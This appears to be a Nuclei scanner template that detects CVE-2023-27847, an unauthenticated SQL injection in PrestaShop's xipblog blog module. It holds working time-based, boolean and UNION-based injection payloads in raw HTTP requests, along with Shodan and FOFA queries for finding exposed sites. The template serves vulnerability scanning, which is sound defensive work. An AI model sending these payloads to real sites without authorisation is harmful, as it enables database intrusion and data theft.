flow: http(1) && http(2) && http(3) && http(4) && http(5)
http:
- host-redirects: true
  matchers:
  - internal: true
    part: body
    type: word
    words:
    - xipblog
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
- host-redirects: true
  matchers:
  - condition: and
    dsl:
    - duration >= 5
    - status_code != 404
    name: time-based
    type: dsl
  raw:
  - '@timeout: 20s

    GET /module/xipblog/archive?id=1&page_type=category&rewrite=news&subpage_type=post"+AND+(SELECT+5728+FROM+(SELECT(SLEEP(5)))AuDU)--+lafl
    HTTP/1.1

    Host: {{Hostname}}

    '
- host-redirects: true
  matchers:
  - internal: true
    part: body
    type: word
    words:
    - kr_blog_post_area
  raw:
  - '@timeout: 20s

    GET /module/xipblog/archive?id=1&page_type=category&rewrite=news&subpage_type=post"+AND+5484=5484--+xhCs
    HTTP/1.1

    Host: {{Hostname}}

    '
- host-redirects: true
  matchers:
  - dsl:
    - '!contains(body, "kr_blog_post_area")'
    internal: false
    name: blind-based
    type: dsl
  raw:
  - 'GET /module/xipblog/archive?id=1&page_type=category&rewrite=news&subpage_type=post"+AND+5484=5485--+xhCs
    HTTP/1.1

    Host: {{Hostname}}

    '
- host-redirects: true
  matchers:
  - condition: and
    dsl:
    - status_code != 404
    - contains(body, "{{md5({{num}})}}")
    name: union-based
    type: dsl
  raw:
  - 'GET /module/xipblog/archive?id=1&page_type=category&rewrite=news&subpage_type=post"+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(md5({{num}})),NULL,NULL--+-
    HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2023-27847
info:
  author: mastercho
  classification:
    cve-id: CVE-2023-27847
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-89
    epss-percentile: 0.98549
    epss-score: 0.68607
  description: 'In the blog module (xipblog), an anonymous user can perform SQL injection.
    Even though the module has been patched in version 2.0.1, the version number was
    not incremented at the time.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary SQL queries, potentially leading to unauthorized access and
    data leakage.

    '
  metadata:
    fofa-query: app="Prestashop"
    framework: prestashop
    max-request: 5
    shodan-query: html:"/xipblog"
    verified: true
  name: PrestaShop xipblog - SQL Injection
  reference:
  - https://security.friendsofpresta.org/modules/2023/03/23/xipblog.html
  - https://nvd.nist.gov/vuln/detail/CVE-2023-27847
  remediation: 'Apply the latest security patches and updates from the vendor to address
    this vulnerability.

    '
  severity: critical
  tags: time-based-sqli,cve,cve2023,prestashop,sqli,xipblog,vuln
variables:
  num: '999999999'
